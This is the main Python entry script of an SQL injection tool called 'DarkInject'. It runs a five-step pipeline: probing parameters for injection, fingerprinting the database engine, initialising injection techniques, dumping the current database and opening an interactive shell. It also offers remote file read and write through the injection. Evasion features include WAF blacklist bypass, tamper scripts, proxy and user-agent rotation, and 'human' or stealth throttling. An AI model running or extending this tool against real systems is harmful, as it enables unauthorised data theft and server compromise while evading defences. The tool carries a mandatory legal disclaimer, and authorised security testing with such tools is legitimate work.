#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DarkInject v1.2.0 - main entry"""
import json
import logging
import sys

from ui.cli import parse_args, print_banner
from ui.shell import interactive_shell
from ui import banner
from ui.progress import RollingBar
from ui.legal import legal_disclaimer
from core.requester import Requester
from core.detector import Detector
from core.fingerprinter import Fingerprinter
from core.engine import Engine
from core.dumper import Dumper
from core.throttle import Throttle
from core.proxy_pool import ProxyPool
from core.waf_detector import WAFDetector
from core.blacklist import build_blacklist
from utils.ua_pool import UAPool
from utils.helpers import parse_kv, parse_cookies, parse_headers, normalize_space
from utils.logger import Logger

# Disable urllib3's redundant logging
logging.getLogger("urllib3").setLevel(logging.ERROR)


def main():
    args = parse_args()

    # ================= Legal disclaimer (must precede any network request) =================
    # Mandatory and non-bypassable: every run requires typing I AGREE (there is no --no-legal switch).
    legal_disclaimer()

    log = Logger(level=args.verbose)

    # ---- Load WAF blacklist (used for automatic bypass) ----
    blacklist = None
    if args.blacklist:
        try:
            blacklist = build_blacklist(path=args.blacklist)
            blacklist.mode = args.waf_mode
        except Exception as e:
            log.warn(f"Failed to load blacklist: {e}")
        if blacklist and blacklist.tokens:
            print(f"[+] Blacklist loaded: {args.blacklist}")
            print(blacklist.describe())
        elif blacklist:
            print(f"[!] Blacklist is empty: {args.blacklist}")

    if args.json_body:
        # JSON body: --data passes JSON text, and the top level must be an object
        try:
            base_data = json.loads(args.data) if args.data.strip() else {}
        except Exception as e:
            log.error(f"--data is not valid JSON: {e}")
            sys.exit(1)
        if not isinstance(base_data, dict):
            log.error('In --json mode the top level of --data must be an object, e.g. {"id": 1}')
            sys.exit(1)
    else:
        base_data = parse_kv(args.data)
    base_params = parse_kv(args.params)
    base_cookies = parse_cookies(args.cookie)
    base_headers = parse_headers(args.header)
    space = normalize_space(args.space)

    url = args.url.strip("'\"")
    if "?" in url:
        url, qs = url.split("?", 1)
        if not base_params:
            base_params = parse_kv(qs)

    # ---- User-Agent ----
    if args.user_agent:
        base_headers["User-Agent"] = args.user_agent
        ua_pool = None
    elif args.random_agent:
        ua_pool = UAPool(rotate="random")
    else:
        base_headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
        )
        ua_pool = None

    # ---- Proxy pool ----
    if args.proxy_file:
        proxy_pool = ProxyPool.from_file(args.proxy_file, rotate=args.proxy_rotate)
        if proxy_pool.size() == 0:
            log.warn(f"Proxy file is empty: {args.proxy_file}")
            proxy_pool = None
    elif args.proxy:
        proxy_pool = ProxyPool([args.proxy], rotate="single")
    else:
        proxy_pool = None

    # ---- Throttle ----
    throttle = Throttle(
        delay=args.delay, jitter=args.jitter,
        qps=args.qps, human_mode=args.human,
    )

    print_banner(url, args, base_data, base_params, base_cookies)

    if proxy_pool:
        print(f"[+] Proxy pool: {proxy_pool.size()} proxies ({args.proxy_rotate})")
    if ua_pool:
        print(f"[+] UA pool: {len(ua_pool.pool)} User-Agents")

    # ---- Build requester ----
    req = Requester(
        url=url, method=args.method, position=args.position, param=args.param,
        base_data=base_data, base_params=base_params,
        base_headers=base_headers, base_cookies=base_cookies,
        timeout=args.timeout,
        throttle=throttle, ua_pool=ua_pool, proxy_pool=proxy_pool,
        retries=args.retries, retry_delay=args.retry_delay,
        log=log, json_body=args.json_body,
    )

    # ---- WAF probing (auto-enabled in stealth mode) ----
    if args.stealth:
        WAFDetector(req, log=log).detect()

    # ---- Step 1/5 ----
    banner.print_step(1, 5, "Probing closing style")
    param_list = getattr(args, "param_list", [args.param])
    injectable = []                     # [(param name, Detector), ...]
    for idx, pname in enumerate(param_list, 1):
        if len(param_list) > 1:
            print(f"[*] Parameter {idx}/{len(param_list)}: {pname}")
        req.param = pname
        req.clear_cache()               # Must clear cache when switching parameters, otherwise the previous parameter's response is hit
        d = Detector(req, space=space, log=log, blacklist=blacklist)
        if d.detect():
            injectable.append((pname, d))
        elif len(param_list) > 1:
            print(f"[-] Parameter {pname}: no injection detected")

    if not injectable:
        log.error("No injection detected in any parameter" if len(param_list) > 1 else "Closing style detection failed")
        sys.exit(1)

    pname, det = injectable[0]
    if len(injectable) > 1:
        rest = ", ".join(p for p, _ in injectable[1:])
        print(f"[+] {len(injectable)} injectable parameters in total, using '{pname}' this time (others: {rest})")
        print("    To target another parameter, run once more with --param <name>")
    # After the loop req.param is left on the last parameter; must reset to the selected one
    req.param = pname
    req.clear_cache()

    # ---- Step 2/5 ----
    banner.print_step(2, 5, "DBMS fingerprinting")
    fp = Fingerprinter(req, det, log=log)
    if args.dbms == "auto":
        fp.detect()
    else:
        fp.force(args.dbms)
    dialect = fp.get_dialect()

    # ---- Step 3/5 ----
    banner.print_step(3, 5, "Initializing injection techniques")
    engine = Engine(
        requester=req, detector=det, dialect=dialect,
        technique=args.technique, tamper=args.tamper,
        log=log, workers=args.workers,
        force_cols=args.cols,
        force_visible_col=args.visible_col,
        charset=args.charset,
        blacklist=blacklist,
        fast=getattr(args, "fast", False),
    )
    if not engine.init():
        log.error("Failed to initialize injection techniques")
        sys.exit(1)
    engine.req = req

    dumper = Dumper(engine, votes=(1 if getattr(args, "fast", False) else 2))

    # ---- Standalone modes ----
    if args.fingerprint:
        fp.print_info()
        return
    if args.file_read:
        from exploit.file_ops import read_file
        read_file(engine, dialect, args.file_read)
        return
    if args.file_write:
        if "::" not in args.file_write:
            log.error("--file-write format: local_path::remote_path")
            return
        local, remote = args.file_write.split("::", 1)
        from exploit.file_ops import write_file
        write_file(engine, dialect, local, remote)
        return

    # ---- Step 4/5 ----
    banner.print_step(4, 5, "Retrieving current database")

    if args.db:
        db_name = args.db
        print(f"    {banner.C.GREEN}[+] Manually specified database: {db_name}{banner.C.RESET}")
    else:
        bar = RollingBar(width=24, prefix="    ")
        bar.start()
        db_name = dumper.get_database()
        if not db_name:
            bar.stop(final_msg="    [-] Failed to retrieve database name")
            log.error("Hint: use --db <name> to manually specify the database name")
            sys.exit(1)
        bar.stop(final_msg=f"    {banner.C.GREEN}[+] Current database: {db_name}{banner.C.RESET}")

    # ---- Step 5/5 ----
    banner.print_step(5, 5, "Entering interactive shell")
    interactive_shell(dumper, db_name, max_rows=args.max_rows, engine=engine)


if __name__ == "__main__":
    main()